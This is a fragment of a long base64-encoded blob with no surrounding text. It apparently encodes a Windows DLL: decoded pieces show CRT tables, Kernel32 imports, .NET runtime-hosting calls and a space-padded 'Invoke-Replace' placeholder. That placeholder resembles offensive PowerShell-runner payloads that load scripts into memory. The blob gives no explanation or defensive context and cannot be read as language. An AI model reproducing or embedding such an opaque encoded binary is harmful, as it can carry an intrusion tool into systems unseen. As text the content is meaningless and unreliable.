3QUFBQUJKQVJBaUFBQUFKRjhCRUdRQUFBQXdYd0VRdmdBQUFFQmZBUkREQUFBQVVGOEJFTEFBQUFCZ1h3RVF1QUFBQUhCZkFSRExBQUFBZ0Y4QkVNY0FBQURBU0FFUUdnQUFBSkJmQVJCY0FBQUE1RkVCRU9NQUFBQ2NYd0VRd2dBQUFMUmZBUkM5QUFBQXpGOEJFS1lBQUFEa1h3RVFtUUFBQU1oSUFSQWJBQUFBL0Y4QkVKb0FBQUFJWUFFUVhRQUFBSWhKQVJBekFBQUFGR0FCRUhvQUFBRHdTUUVRUUFBQUFDQmdBUkNLQUFBQXNFa0JFRGdBQUFBd1lBRVFnQUFBQUxoSkFSQTVBQUFBUEdBQkVJRUFBQURRU0FFUUhBQUFBRWhnQVJCZUFBQUFWR0FCRUc0QUFBRFlTQUVRSFFBQUFHQmdBUkJmQUFBQW1Fa0JFRFVBQUFCc1lBRVFmQUFBQVBCSUFSQWdBQUFBZUdBQkVHSUFBQURnU0FFUUhnQUFBSVJnQVJCZ0FBQUFrRWtCRURRQUFBQ1FZQUVRbmdBQUFLaGdBUkI3QUFBQUtFa0JFQ2NBQUFEQVlBRVFhUUFBQU14Z0FSQnZBQUFBMkdBQkVBTUFBQURvWUFFUTRnQUFBUGhnQVJDUUFBQUFCR0VCRUtFQUFBQVFZUUVRc2dBQUFCeGhBUkNxQUFBQUtHRUJFRVlBQUFBMFlRRVFjQUFBQUdFQVpnQXRBSG9BWVFBQUFHRUFjZ0F0QUdFQVpRQUFBR0VBY2dBdEFHSUFhQUFBQUdFQWNnQXRBR1FBZWdBQUFHRUFjZ0F0QUdVQVp3QUFBR0VBY2dBdEFHa0FjUUFBQUdFQWNnQXRBR29BYndBQUFHRUFjZ0F0QUdzQWR3QUFBR0VBY2dBdEFHd0FZZ0FBQUdFQWNnQXRBR3dBZVFBQUFHRUFjZ0F0QUcwQVlRQUFBR0VBY2dBdEFHOEFiUUFBQUdFQWNnQXRBSEVBWVFBQUFHRUFjZ0F0QUhNQVlRQUFBR0VBY2dBdEFITUFlUUFBQUdFQWNnQXRBSFFBYmdBQUFHRUFjZ0F0QUhrQVpRQUFBR0VBZWdBdEFHRUFlZ0F0QUdNQWVRQnlBR3dBQUFBQUFHRUFlZ0F0QUdFQWVnQXRBR3dBWVFCMEFHNEFBQUFBQUdJQVpRQXRBR0lBZVFBQUFHSUFad0F0QUdJQVp3QUFBR0lBYmdBdEFHa0FiZ0FBQUdJQWN3QXRBR0lBWVFBdEFHd0FZUUIwQUc0QUFBQUFBR01BWVFBdEFHVUFjd0FBQUdNQWN3QXRBR01BZWdBQUFHTUFlUUF0QUdjQVlnQUFBR1FBWVFBdEFHUUFhd0FBQUdRQVpRQXRBR0VBZEFBQUFHUUFaUUF0QUdNQWFBQUFBR1FBWlFBdEFHUUFaUUFBQUdRQVpRQXRBR3dBYVFBQUFHUUFaUUF0QUd3QWRRQUFBR1FBYVFCMkFDMEFiUUIyQUFBQUFBQmxBR3dBTFFCbkFISUFBQUJsQUc0QUxRQmhBSFVBQUFCbEFHNEFMUUJpQUhvQUFBQmxBRzRBTFFCakFHRUFBQUJsQUc0QUxRQmpBR0lBQUFCbEFHNEFMUUJuQUdJQUFBQmxBRzRBTFFCcEFHVUFBQUJsQUc0QUxRQnFBRzBBQUFCbEFHNEFMUUJ1QUhvQUFBQmxBRzRBTFFCd0FHZ0FBQUJsQUc0QUxRQjBBSFFBQUFCbEFHNEFMUUIxQUhNQUFBQmxBRzRBTFFCNkFHRUFBQUJsQUc0QUxRQjZBSGNBQUFCbEFITUFMUUJoQUhJQUFBQmxBSE1BTFFCaUFHOEFBQUJsQUhNQUxRQmpBR3dBQUFCbEFITUFMUUJqQUc4QUFBQmxBSE1BTFFCakFISUFBQUJsQUhNQUxRQmtBRzhBQUFCbEFITUFMUUJsQUdNQUFBQmxBSE1BTFFCbEFITUFBQUJsQUhNQUxRQm5BSFFBQUFCbEFITUFMUUJvQUc0QUFBQmxBSE1BTFFCdEFIZ0FBQUJsQUhNQUxRQnVBR2tBQUFCbEFITUFMUUJ3QUdFQUFBQmxBSE1BTFFCd0FHVUFBQUJsQUhNQUxRQndBSElBQUFCbEFITUFMUUJ3QUhrQUFBQmxBSE1BTFFCekFIWUFBQUJsQUhNQUxRQjFBSGtBQUFCbEFITUFMUUIyQUdVQUFBQmxBSFFBTFFCbEFHVUFBQUJsQUhVQUxRQmxBSE1BQUFCbUFHRUFMUUJwQUhJQUFBQm1BR2tBTFFCbUFHa0FBQUJtQUc4QUxRQm1BRzhBQUFCbUFISUFMUUJpQUdVQUFBQm1BSElBTFFCakFHRUFBQUJtQUhJQUxRQmpBR2dBQUFCbUFISUFMUUJtQUhJQUFBQm1BSElBTFFCc0FIVUFBQUJtQUhJQUxRQnRBR01BQUFCbkFHd0FMUUJsQUhNQUFBQm5BSFVBTFFCcEFHNEFBQUJvQUdVQUxRQnBBR3dBQUFCb0FHa0FMUUJwQUc0QUFBQm9BSElBTFFCaUFHRUFBQUJvQUhJQUxRQm9BSElBQUFCb0FIVUFMUUJvQUhVQUFBQm9BSGtBTFFCaEFHMEFBQUJwQUdRQUxRQnBBR1FBQUFCcEFITUFMUUJwQUhNQUFBQnBBSFFBTFFCakFHZ0FBQUJwQUhRQUxRQnBBSFFBQUFCcUFHRUFMUUJxQUhBQUFBQnJBR0VBTFFCbkFHVUFBQUJyQUdzQUxRQnJBSG9BQUFCckFHNEFMUUJwQUc0QUFBQnJBRzhBYXdBdEFHa0FiZ0FBQUFBQWF3QnZBQzBBYXdCeUFBQUFhd0I1QUMwQWF3Qm5BQUFBYkFCMEFDMEFiQUIwQUFBQWJBQjJBQzBBYkFCMkFBQUFiUUJwQUMwQWJnQjZBQUFBYlFCckFDMEFiUUJyQUFBQWJRQnNBQzBBYVFCdUFBQUFiUUJ1QUMwQWJRQnVBQUFBYlFCeUFDMEFhUUJ1QUFBQWJRQnpBQzBBWWdCdUFBQUFiUUJ6QUMwQWJRQjVBQUFBYlFCMEFDMEFiUUIwQUFBQWJnQmlBQzBBYmdCdkFBQUFiZ0JzQUMwQVlnQmxBQUFBYmdCc0FDMEFiZ0JzQUFBQWJnQnVBQzBBYmdCdkFBQUFiZ0J6QUMwQWVnQmhBQUFBY0FCaEFDMEFhUUJ1QUFBQWNBQnNBQzBBY0FCc0FBQUFjQUIwQUMwQVlnQnlBQUFBY0FCMEFDMEFjQUIwQUFBQWNRQjFBSG9BTFFCaUFHOEFBQUFBQUhFQWRRQjZBQzBBWlFCakFBQUFBQUJ4QUhVQWVnQXRBSEFBWlFBQUFBQUFjZ0J2QUMwQWNnQnZBQUFBY2dCMUFDMEFjZ0IxQUFBQWN3QmhBQzBBYVFCdUFBQUFjd0JsQUMwQVpnQnBBQUFBY3dCbEFDMEFiZ0J2QUFBQWN3QmxBQzBBY3dCbEFBQUFjd0JyQUMwQWN3QnJBQUFBY3dCc0FDMEFjd0JwQUFBQWN3QnRBR0VBTFFCdUFHOEFBQUFBQUhNQWJRQmhBQzBBY3dCbEFBQUFBQUJ6QUcwQWFnQXRBRzRBYndBQUFBQUFjd0J0QUdvQUxRQnpBR1VBQUFBQUFITUFiUUJ1QUMwQVpnQnBBQUFBQUFCekFHMEFjd0F0QUdZQWFRQUFBQUFBY3dCeEFDMEFZUUJzQUFBQWN3QnlBQzBBWWdCaEFDMEFZd0I1QUhJQWJBQUFBQUFBY3dCeUFDMEFZZ0JoQUMwQWJBQmhBSFFBYmdBQUFBQUFjd0J5QUMwQWN3QndBQzBBWXdCNUFISUFiQUFBQUFBQWN3QnlBQzBBY3dCd0FDMEFiQUJoQUhRQWJnQUFBQUFBY3dCMkFDMEFaZ0JwQUFBQWN3QjJBQzBBY3dCbEFBQUFjd0IzQUMwQWF3QmxBQUFBY3dCNUFISUFMUUJ6QUhrQUFBQUFBSFFBWVFBdEFHa0FiZ0FBQUhRQVpRQXRBR2tBYmdBQUFIUUFhQUF0QUhRQWFBQUFBSFFBYmdBdEFIb0FZUUFBQUhRQWNnQXRBSFFBY2dBQUFIUUFkQUF0QUhJQWRRQUFBSFVBYXdBdEFIVUFZUUFBQUhVQWNnQXRBSEFBYXdBQUFIVUFlZ0F0QUhVQWVnQXRBR01BZVFCeUFHd0FBQUFBQUhVQWVnQXRBSFVBZWdBdEFHd0FZUUIwQUc0QUFBQUFBSFlBYVFBdEFIWUFiZ0FBQUhnQWFBQXRBSG9BWVFBQUFIb0FhQUF0QUdNQWFBQnpBQUFBQUFCNkFHZ0FMUUJqQUdnQWRBQUFBQUFBZWdCb0FDMEFZd0J1QUFBQWVnQm9BQzBBYUFCckFBQUFlZ0JvQUMwQWJRQnZBQUFBZWdCb0FDMEFjd0JuQUFBQWVnQm9BQzBBZEFCM0FBQUFlZ0IxQUMwQWVnQmhBQUFBQU9RTFZBSUFBQUFBQUJCakxWN0hhd1VBQUFBQUFBQkE2dTEwUnRDY0xKOE1BQUFBQUdIMXVhdS9wRnpEOFNsakhRQUFBQUFBWkxYOU5BWEUwb2Rta3ZrVk8yeEVBQUFBQUFBQUVObVFaWlFzUW1MWEFVVWltaGNtSjArZkFBQUFRQUtWQjhHSlZpUWNwL3JGWjIzSWM5eHRyZXR5QVFBQUFBREJ6bVFub21QS0dLVHZKWHZSelhEdjMyc2ZQdXFkWHdNQUFBQUFBT1J1L3NQTmFneThaaklmT1M0REFrVmFKZmpTY1ZaS3dzUGFCd0FBRUk4dXFBaERzcXA4R2lHT1FNNks4d3ZPeElRbkMrdDh3NVFsclVrU0FBQUFRQnJkMmxTZnpMOWhXZHlycTF6SERFUUY5V2NXdk5GU3I3ZjdLWTJQWUpRcUFBQUFBQUFoRElxN0Y2U09yMWFwbjBjR05ySkxYZUJmM0lBS3F2N3dRTm1PcU5DQUdtc2pZd0FBWkRoTU1wYkhWNFBWUWtya1lTS3AyVDBRUEwxeTgrV1JkQlZad0EybUhleHMyU29RMCtZQUFBQVFoUjViWVU5dWFTcDdHQnppVUFRck5OMHY3aWRRWTVseHlhWVc2VXFPS0M0SUYyOXVTUnB1R1FJQUFBQkFNaVpBclFSUWNoNzUxZEdVS2J2TlcyYVdManVpMjMzNlpheFQzbmVib2lDd1UvbS94cXNsbEV0TjR3UUFnUzNEKy9UUUlsSlFLQSszOC9JVFZ4TVVRdHg5WFRuV21SbForQnc0a2dEV0ZMT0d1WGVsZW1IK3R4SnFZUXNBQU9RUkhZMW53MVlnSDVRNml6WUptd2hwY0wyK1pYWWc2OFFtbTUzb1p4VnVDUldkSy9JeWNSTlJTTDdPb3VWRlVuOGFBQUFBRUx0NGxQY0N3SFFiakFCZDhMQjF4dHVwRkxuWjR0OXlEMlZNU3loM0Z1RDJiY0tSUTFIUHlaVW5WYXZpMWlmbXFKeW1zVDBBQUFBQVFFclE3UFR3aUNOL3hXMEtXRzhFdjBQRFhTMzRTQWdSN2h4Wm9Qb284UFROUDZVdUdhQngxcnlIUkdsOUFXNzVFSjFXR25sMXBJOEFBT0d5dVR4MWlJS1RGai9OYXpxMGlkNkhuZ2hHUlUxb0RLYmIvWkdUSk44VDdHZ3dKMFMwbWU1QmdiYkR5Z0pZOFZGbzJhSWxkbjJOY1U0QkFBQmsrK2FEV3ZJUHJWZVVFYldBQUdhMUtTRFAwc1hYZlcwL3BSeE50ODNlY0ozYVBVRVd0MDdLMEhHWUUrVFhrRHBBVCtJL3EvbHZkMDBtNXE4S0F3QUFBQkF4VmFzSjBsZ01wc3NtWVZhSGd4eHF3ZlNIZFhib1JDelBSNkJCbmdVSXlUNEd1cURveU0vblZjRDY0YkpFQWUrd2ZpQWtjeVZ5MFlINXVPU3VCUlVIUUdJN2VrOWRwTTR6UWVKUGJXMFBJZkl6VnVWV0U4RWxsOWZyS0lUcmx0TjNPMGtlcmkwZlJ5QTRyWmJSenZxSzI4M2VUb2JBYUZXaFhXbXlpVHdTSkhGRmZSQUFBRUVjSjBvWGJsZXVZdXlxaVNMdjNmdWl0dVR2NFJmeXZXWXpnSWkwTno0c3VMK1IzcXdaQ0dUMDFFNXEvelVPYWxabkZMbmJRTW83S25ob216SnIyY1d2OWJ4cFpDWUFBQURrOUYrQSs2L1JWZTJvSUVxYitGZVhxd3IrcmdGN3BpeEthWlcvSGlrY3hNZXEwdFhZZHNjMjBReFYycE9RbmNlYXFNdExKUmgyOEEwSmlLajNkQkFmT3Z3UlNPV3RqbU5aRU9mTGwraHAxeVkrY3VTMGhxcVFXeUk1TTV4MUIzcExrZWxITFhmNWJwcm5RQXNXeFBpU0RCRHdYL0lSYk1NbFFvdjV5WjJSQzNPdmZQOEZoUzFEc0dsMUt5MHNoRmVtRU84ZjBBQkFlc2ZsWXJqb2FvallFT1dZemNqRlZZa1FWYlpaME5TKysxZ3hncmdER1VWTUF6bkpUUm1zQU1VZjRzQk1lYUdBeVR2UkxiSHArQ0p0WHBxSk9IdllHWG5PY25iR2VKKzU1WGxPQTVUa0FRQUFBQUFBQUtIcDFGeHNiMzNrbStmWk8vbWhiMkozVVRTTHh1aFpLOTVZM2p6UFdQOUdJaFY4VjZoWmRlY21VMmQzRjJPMzV1dGZDdjNqYVRub016V2dCYWlIdVRIMlF3OGZJZHREV3RpVzlSdXJvaGsvYUFRQUFBQmsvbjIrTHdUSlM3RHQ5ZUhhVHFHUGM5c0o1Snp1VDJjTm54V3AxclcxOWc2V09IT1J3a25yekpjclg1VS9PQS8yczVFZ0ZEZDQwZDlDMGNIZUlqNFZWOSt2aWwvbDlYZUx5dWVqVzFJdkF6MVA1MElLQUFBQUFCRGQ5RklKUlYzaFFyU3VMalN6bzIranpUOXVlaWkwOTNmQlM5REkwbWZnK0tpdVp6dkpyYk5XeUd3TG5aMlZBTUZJV3oyS3ZrcjBOdGxTVGVqYmNjVWhIUGtKZ1VWS2F0aXExM3hNNFFpY3BadDFBSWc4NUJjQUFBQUFBRUNTMUJEeEJMNXlaQmdNd1RhSCs2dDRGQ212VWZ3NWwrc2xGVEFyVEFzT0E2RTdQUDRvdXZ5SWQxaERucmlrNUQxend2SkdmSmhpZEk4UElSbmJycmFqTHJJVVVLcU5xem5xUWpTV2w2bmYzd0grMC9QU2dBSjVvRGNBQUFBQm01eFE4YTNjeHl5dFBUZzNUY1p6MEdkdDZnYW9tMUg0OGdQRW91RlNvRG9qRU5lcGM0VkV1dGtTendNWWgzQ2JPdHhTNkZLeTVVNzdGd2N2cGsyKzRkZXJDay90WW94NzdMbk9JVUJtMUFDREZhSG1kZVBNOGlrdmhJRUFBQUFBNUJkM1pQdjEwM0U5ZHFEcEx4Ujlaa3owTXk3eHVQT09EUThUYVpSTWM2Z1BKbUJBRXdFOENvaHh6Q0V0cFRmdnlkcUt0REc3UWtGTStkWnNCWXZJdUFFRjRuenRsMUxFWWNOaXF0amFoOTdxTTdoaGFQQ1V2WnJNRTJyVndZMHRBUUFBQUFBUUUrZzJlc2FlS1JiMENqOUo4OCttcFhlakk3NmtnbHVpekM5eUVEVi9SSjIrdUJQQ3FFNHlUTW10TTU2OHV2NnNkakloVEM0eXpSTSt0SkgrY0RiWlhMdUZseFJDL1JyTVJ2amRPT2JTaHdkcEY5RUNHdjd4dFQ2dXE3bkRiKzRJSEw0Q0FBQUFBQUJBcXNKQWdkbDMrQ3c5MStGeG1DL24xUWxqVVhMZEdhaXZSbG9xMXM3Y0FpciszVWJPalNRVEo2M1NJN2NadXdURUs4d0d0OHJyc1VmY1N3bWR5Z0xjeFk1UjVqR0FWc09PcUZndk5FSWVCSXNVNWIvK0Uvei9CUTk1WTJmOU50Vm1kbERodVdJR0FBQUFZYkJuR2dvQjBzRGhCZEE3Y3hMYlB5NmZvK0tkc21IaTNHTXF2QVFtbEp2VmNHR1dKZVBDdVhVTEZDRXNIUjlnYWhPNG9qdlNpWE45OFdEZjE4ckdLOTlwQmplSHVDVHRCcE5tNjI1SkdXL2JqWk4xZ25SZU5wcHV4VEcza0RiRlFpaklqbm11Sk40T0FBQUFBR1JCd1pxSTFaa3NROWthNTRDaUxqMzJhejE1U1lKRHFlZDVTdWI5SXBwdzF1RHZ6OG9GMTZTTnZXd0FaT096M0U2bGJnaW9vWjVGajNUSVZJNzhWOFowek5URHVFSnVZOWxYekZ1MU5lbitFMnhoVWNRYTI3cVZ0WjFPOGFGUTUvbmNjWDlqQnl1Zkw5NmRJZ0FBQUFBQUVJbTlYanhXTjNmak9LUExQVStlMG9Fc252ZWtkTWY1dzVmbkhHbzQ1Ritzbkl2ekIvcnNpTldzd1ZvK3pzeXZoWEEvSDUzVGJTM29EQmg5RjIrVWFWN2hMSTVrU0RtaGxSSGdEelJZUEJlMGxQWklKNzFYSm53dTJvdDFvSkNBT3hPMjJ5MlFTTTl0ZmdUa0pKbFFBQUFBQUFBQ0FnQUFBd1VBQUFRSkFBRUVEUUFCQlJJQUFRWVlBQUlHSGdBQ0J5VUFBZ2d0QUFNSU5RQURDVDRBQXdwSUFBUUtVZ0FFQzEwQUJBeHBBQVVNZFFBRkRZSUFCUTZRQUFVUG53QUdENjRBQmhDK0FBWVJ6d0FIRWVBQUJ4THlBQWNUQlFFSUV4Z0JDQlV0QVFnV1F3RUpGbGtCQ1Jkd0FRa1lpQUVLR0tBQkNobTVBUW9hMHdFS0crNEJDeHNKQWdzY0pRSUxIUW9BQUFCa0FBQUE2QU1BQUJBbkFBQ2doZ0VBUUVJUEFJQ1dtQUFBNGZVRkFNcWFPekFBQUFBeEkwbE9SZ0FBQURFalVVNUJUZ0FBTVNOVFRrRk9BQUF4STBsT1JBQUFBQUFBQUFBQUFBQUFiRzluTVRBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVBBL0FBQUFBQUFBOEQ4ekJBQUFBQUFBQURNRUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUDhIQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWdFTUFUd0JPQUU4QVZRQlVBQ1FBQUFBQUFBQUFBQUFBQVAvLy8vLy8vdzhBLy8vLy8vLy9Ed0FBQUFBQUFNRGJQd0FBQUFBQXdOcy9FUGovLy8vL2owSVErUC8vLy8rUFFnQUFBSUQvLy85L0FBQUFnUC8vLzM4QWVKOVFFMFRUUDFpekVoOHg3eDg5QUFBQUFBQUFBQUQvLy8vLy8vLy8vLy8vLy8vLy8vLy9BQUFBQUFBQUFBQUFBQUFBQUFEd1B3QUFBQUFBQVBBL0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREJEQUFBQUFBQUFNRU1BQUFBQUFBRHcvd0FBQUFBQUFQQi9BUUFBQUFBQThIOEJBQUFBQUFEd2Yvbk9sOFlVaVRWQVBZRXBaQW1UQ01CVmhEVnFnTWtsd05JMWx0d0NhdncvOTVrWWZwK3JGa0Exc1hmYzhucnl2d2hCTHI5c2Vsby9BQUFBQUFBQUFBQUFBQUFBQUFBQWdQOS9BQUFBQUFBQUFJRC8vOXluMTdtRlpuR3hEVUFBQUFBQUFBRC8vdzFBOXpaRERKZ1o5cFg5UHdBQUFBQUFBT0EvQTJWNGNBQUFBQUFBQUFBQUFBRVVBRkg2QUJCYS9RQVFYLzBBRUlIN0FCQUFBQUFBQUFBQUFBQUFBQUFBd1AvL05jSm9JYUxhRDhuL1B6WENhQ0dpMmcvSi9qOEFBQUFBQUFEd1B3QUFBQUFBQUFoQUNBUUlDQWdFQ0FnQUJBd0lBQVFNQ0FBQUFBQUFBQUFBOEQ5L0FqWENhQ0dpMmcvSlBrRC8vLy8vLy8vdmZ3QUFBQUFBQUJBQUFBQUFBQUFBbU1BQUFBQUFBQUNZUUFBQUFBQUFBUEIvQUFBQUFBQUFBQUJzYjJjQWJHOW5NVEFBQUFCbGVIQUFjRzkzQUdGemFXNEFBQUFBWVdOdmN3QUFBQUJ6Y1hKMEFBQUFBQUFBQUFBQUFQQS9BQUFBQUFBQUFJQVFSQUFBQVFBQUFBQUFBSUFBTUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQTVBcW9BM3cvRy9kUkxUZ0ZQajBBQU42Mm5WZUxQd1V3Ky80SmF6ZzlBSUNXM3E1d2xEOGQ0WkVNZVB3NVBRQUFQbzR1MnBvL0duQnVudEViTlQwQXdGbjMySzJnUDZFQUFBbFJLaHM5QUFCanh2ZjZvejgvOVlIeFlqWUlQUURBNzFrZUY2Yy8yMVRQUHhxOUZqMEFBTWNDa0Q2cVA0YlQwTWhYMGlFOUFFRERMVE15clQ4ZlJObjQyM29iUFFDZzFuQVJLTEEvZGxDdktJdnpHejBBWVBIc0g1eXhQOVJWVXg0LzRENDlBTUJsL1JzVnN6K1ZaNHdFZ09JM1BRQmd4WUFuazdRLzg2Vml6YXpFTHowQWdPbGVjd1cyUDU5OW9TUFB3eGM5QUtCS2pYZHJ0ejk2YnFBUzZBTWNQUURBNUU0TDFyZy9na3hPek9VQU9UMEFRQ1FpdERPNlB6VlhaelJ3OFRZOUFJQ25WTGFWdXovSFRuWWtYZzRwUFFEZzZRSW02cncveThzdWdpblI2endBb0d6QnRFSytQK2xOamZNUDVTVTlBR0Jxc1FXTnZ6K25kN2VpcFk0cVBRQWdQTVdiYmNBL1Jmcmg3bzJCTWowQUFONnNQZzNCUDY3d2c4dEZpaDQ5QU5CMEZUKzR3VC9VLzVQeEdRc0JQUURRVHdYK1VjSS93SGNvUUFtcy9qd0E0UFFjTVBmQ1AwRmpHZzNIOVRBOUFGQjVEM0NVd3o5a2NocDVQK2tmUFFDZ3RGTjBLY1EvTkV1OHhRbk9QajBBd1A3NkpNckVQMUZvNWtKRElDNDlBREFKRW5WaXhUOHRGNnF6N044d1BRQUE5aG9hOHNVL0UyRStMUnZ2UHowQUFKQVdvbzNHUDlDWmx2d3NsTzA4QUFBb2JGZ2d4ei9OVkVCaXFDQTlQUUJRSFArVnRNYy94VE9SYUN3QkpUMEFvTTVtb2ovSVA1OGpoNGJCeGlBOUFQQldEQTdNeUQvZm9NK2h0T00yUFFEUTUrL2ZXY2svNWVEL2VnSWdKRDBBd05KSEgrbkpQeUFrOG13T016VTlBRUFEaTZSdXlqOS9XeXU1ck9zelBRRHdVc1czQU1zL2M2cGtUR24wUFQwQWNQbDg1b2pMUDNLZ2VDSWovekk5QUVBdXV1TUd6RDk4dlZYTkZjc3lQUUFBYk5TZGtjdy9jcXptbEVhMkRqMEFrQk5oK3hITlB3dVdycEhiTkJvOUFCRDlxMW1melQ5emJOZThJM3NnUFFCZ2ZsSTlGczQvNUpNdThtbWRNVDBBb0FMY0xKck9QNGZ4Z1pEMTZ5QTlBSkNVZGxnZnp6OEFrQmZxNjY4SFBRQncyeCtBbWM4L2FKYnk5MzF6SWowQTBBbEZXd3JRUDM4bFV5TmJheDg5QU9qN040QkkwRC9HRXJtNWsyb2JQUUNvSVZZeGg5QS9ydk8vZmRwaE1qMEF1R29kY2NiUVB6TEJNSTFLNlRVOUFLalN6ZG4vMEQrQW5mSDJEalVXUFFCNHdyNHZRTkUvaTdvaVFpQThNVDBBa0drWmwzclJQNWxjTFNGNThpRTlBRmlzTUhxMTBUOStoUDlpUHM4OVBRQzRPaFhiOE5FLzN3NE1JeTVZSnowQVNFSlBEaWJTUC9rZnBDZ1FmaFU5QUhnUnBtSmkwajhTR1F3dUdyQVNQUURZUThCeG1OSS9lVGVlckdrNUt6MEFnQXQyd2RYU1A3OElENzdlNmpvOUFEQzdwN01NMHo4eTJMWVptWkk0UFFCNG4xQVRSTk0vV0xNU0h6SHZIejBBQUFBQUFNRGJQd0FBQUFBQXdOcy9BQUFBQUFCUjJ6OEFBQUFBQUZIYlB3QUFBQUR3Nk5vL0FBQUFBUERvMmo4QUFBQUE0SURhUHdBQUFBRGdnTm8vQUFBQUFNQWYyajhBQUFBQXdCL2FQd0FBQUFDZ3Z0ay9BQUFBQUtDKzJUOEFBQUFBZ0YzWlB3QUFBQUNBWGRrL0FBQUFBRkFEMlQ4QUFBQUFVQVBaUHdBQUFBQWdxZGcvQUFBQUFDQ3AyRDhBQUFBQTRGWFlQd0FBQUFEZ1ZkZy9BQUFBQUNqLzF6OEFBQUFBS1AvWFB3QUFBQUJncjljL0FBQUFBR0N2MXo4QUFBQUFtRi9YUHdBQUFBQ1lYOWMvQUFBQUFOQVAxejhBQUFBQTBBL1hQd0FBQUFDQXc5WS9BQUFBQUlERDFqOEFBQUFBcUhyV1B3QUFBQUNvZXRZL0FBQUFBTkF4MWo4QUFBQUEwREhXUHdBQUFBQnc3TlUvQUFBQUFIRHMxVDhBQUFBQUVLZlZQd0FBQUFBUXA5VS9BQUFBQUNobDFUOEFBQUFBS0dYVlB3QUFBQUJBSTlVL0FBQUFBRUFqMVQ4QUFBQUEwT1RVUHdBQUFBRFE1TlEvQUFBQUFHQ20xRDhBQUFBQVlLYlVQd0FBQUFCb2E5US9BQUFBQUdocjFEOEFBQUFBK0N6VVB3QUFBQUQ0TE5RL0FBQUFBSGoxMHo4QUFBQUFlUFhUUHdBQUFBQ0F1dE0vQUFBQUFJQzYwejhBQUFBQUFJUFRQd0FBQUFBQWc5TS9BQUFBQVBoTzB6OEFBQUFBK0U3VFB3QUFBQUI0RjlNL0FBQUFBSGdYMHo4QUFBQUFjT1BTUHdBQUFBQnc0OUkvQUFBQUFPQ3kwajhBQUFBQTRMTFNQd0FBQUFEWWZ0SS9BQUFBQU5oKzBqOEFBQUFBU0U3U1B3QUFBQUJJVHRJL0FBQUFBTGdkMGo4QUFBQUF1QjNTUHdBQUFBQ2c4TkUvQUFBQUFLRHcwVDhBQUFBQWlNUFJQd0FBQUFDSXc5RS9BQUFBQUhDVzBUOEFBQUFBY0piUlB3QUFBQUJZYWRFL0FBQUFBRmhwMFQ4QUFBQUF1RC9SUHdBQUFBQzRQOUUvQUFBQUFLQVMwVDhBQUFBQW9CTFJQd0FBQUFBQTZkQS9BQUFBQUFEcDBEOEFBQUFBMk1MUVB3QUFBQURZd3RBL0FBQUFBRGlaMEQ4QUFBQUFPSm5RUHdBQUFBQVFjOUEvQUFBQUFCQnowRDhBQUFBQWNFblFQd0FBQUFCd1NkQS9BQUFBQU1BbTBEOEFBQUFBd0NiUVB3QUFBQUNZQU5BL0FBQUFBSmdBMEQ4QUFBQUE0TFRQUHdBQUFBRGd0TTgvQUFBQUFJQnZ6ejhBQUFBQWdHL1BQd0FBQUFBZ0tzOC9BQUFBQUNBcXp6OEFBQUFBd09UT1B3QUFBQURBNU00L0FBQUFBR0Nmemo4QUFBQUFZSi9PUHdBQUFBQUFXczQvQUFBQUFBQmF6ajhBQUFBQWtCdk9Qd0FBQUFDUUc4NC9BQUFBQUREV3pUOEFBQUFBTU5iTlB3QUFBQURBbDgwL0FBQUFBTUNYelQ4QUFBQUFVRm5OUHdBQUFBQlFXYzAvQUFBQUFPQWF6VDhBQUFBQTRCck5Qd0FBQUFCZzQ4dy9BQUFBQUdEanpEOEFBQUFBOEtUTVB3QUFBQUR3cE13L0FBQUFBSEJ0ekQ4QUFBQUFjRzNNUHdBQUFBQUFMOHcvQUFBQUFBQXZ6RDhBQUFBQWdQZkxQd0FBQUFDQTk4cy9BQUFBQUFEQXl6OEFBQUFBQU1ETFB3QUFBQUFBQU9BL2RHRnVhQUFBQUFCaGRHRnVBQUFBQUdGMFlXNHlBQUFBYzJsdUFHTnZjd0IwWVc0QVkyVnBiQUFBQUFCbWJHOXZjZ0FBQUdaaFluTUFBQUFBYlc5a1pnQUFBQUJzWkdWNGNBQUFBRjlqWVdKekFBQUFYMmg1Y0c5MEFBQm1iVzlrQUFBQUFHWnlaWGh3QUFBQVgza3dBRjk1TVFCZmVXNEFYMnh2WjJJQUFBQmZibVY0ZEdGbWRHVnlBQUFBQUFBQUZBQUFBSkJ0QVJBZEFBQUFsRzBCRUJvQUFBQ0ViUUVRR3dBQUFJaHRBUkFmQUFBQWNIY0JFQk1BQUFCNGR3RVFJUUFBQVBoMUFSQU9BQUFBbUcwQkVBMEFBQUNnYlFFUUR3QUFBQUIyQVJBUUFBQUFDSFlCRUFVQUFBQ29iUUVRSGdBQUFCQjJBUkFTQUFBQUZIWUJFQ0FBQUFBWWRnRVFEQUFBQUJ4MkFSQUxBQUFBSkhZQkVCVUFBQUFzZGdFUUhBQUFBRFIyQVJBWkFBQUFQSFlCRUJFQUFBQkVkZ0VRR0FBQUFFeDJBUkFXQUFBQVZIWUJFQmNBQUFCY2RnRVFJZ0FBQUdSMkFSQWpBQUFBYUhZQkVDUUFBQUJzZGdFUUpRQUFBSEIyQVJBbUFBQUFlSFlCRUhOcGJtZ0FBQUFBWTI5emFBQUFBQUFBQUFBQUFBRHdmLy8vLy8vLy8rOS9BQUFBQUFBQUFJQkxBR1VBY2dCdUFHVUFiQUF6QURJQUxnQmtBR3dBYkFBQUFBQUFSMlYwVG1GMGFYWmxVM2x6ZEdWdFNXNW1id0JIWlhSRFQxSldaWEp6YVc5dUFBQUFRMjl5UW1sdVpGUnZVblZ1ZEdsdFpRQUFBQUJIWlhSU1pYRjFaWE4wWldSU2RXNTBhVzFsU1c1bWJ3QjJBREVBTGdBd0FDNEFNd0EzQURBQU5RQUFBQ05uTDhzNnE5SVJuRUFBd0UrakNqNUpBRzRBZGdCdkFHc0FaUUF0QUZJQVpRQndBR3dBWVFCakFHVUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBS